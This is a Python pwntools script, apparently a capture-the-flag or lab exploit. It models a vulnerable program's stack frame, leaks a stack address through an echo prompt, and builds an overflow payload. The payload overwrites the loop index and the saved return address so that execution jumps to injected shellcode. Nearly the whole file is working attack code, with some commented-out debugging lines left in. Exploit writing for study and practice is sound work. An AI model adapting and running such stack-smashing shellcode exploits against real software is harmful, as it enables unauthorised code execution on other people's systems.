#!/bin/python

import IPython
from pwn import *
from ctypes import *
from argparse import *


class Stack_Vars(Structure):
    _pack_ = 1
    _fields_ = [("user_in",     c_uint32),
                ("__pad1__",    c_uint64),
                ("buzz_ptr",    c_uint64),

                ("__pad2__",    c_uint32),
                ("iter_idx",    c_uint32),

                ("ans_ptr",      c_uint64),
                ("ans_out",     c_uint64),

                ("saved_rbp",   c_uint64),
                ("ret_rip",     c_uint64),
                ]


def get_quad_word(proc: process, count: int, payload: bytes):
    proc.send(payload[:count])
    proc.recvuntil(b'You entered: ')
    proc.recv(count)

    return proc.recvline()[:-1].ljust(8, b'\x00')[:8]


def get_stack_offset(attr: str):
    return getattr(Stack_Vars, attr, -1).offset


def set_stack_attr(proc: process, obj: Stack_Vars, attr: str):
    val = u64(get_quad_word(proc, get_stack_offset(attr), bytes(obj)))
    setattr(obj, attr, val)


def get_payload(args: Namespace, proc: process):
    payload = Stack_Vars()
    memset(addressof(payload), 0x22, sizeof(payload))
    payload.iter_idx = -11

    for _ in range(5):
        get_quad_word(proc, 1, b'A')

    set_stack_attr(proc, payload, 'ans_ptr')
    payload.ans_out = payload.ans_ptr
    payload.ret_rip = payload.ans_ptr - get_stack_offset('buzz_ptr') 

    print(f'ans_ptr addr: {hex(payload.ans_ptr)}')

#    IPython.embed()

#    set_stack_attr(args.proc, payload, 'buzz_ptr')
#    print(f'Buzz ptr: {hex(payload.buzz_ptr)}')
#    payload.ans_out = u64(get_quad_word(proc, , payload))
#    print(f'ans_ptr_out addr: {hex(payload.ans_out)}')
    payload.iter_idx = 15
    return cyclic(4) + args.shellcode_asm + bytes(payload)[len(args.shellcode_asm)+4:]


def send_in_payload(payload: bytes, proc: process):
    proc.sendline(payload)
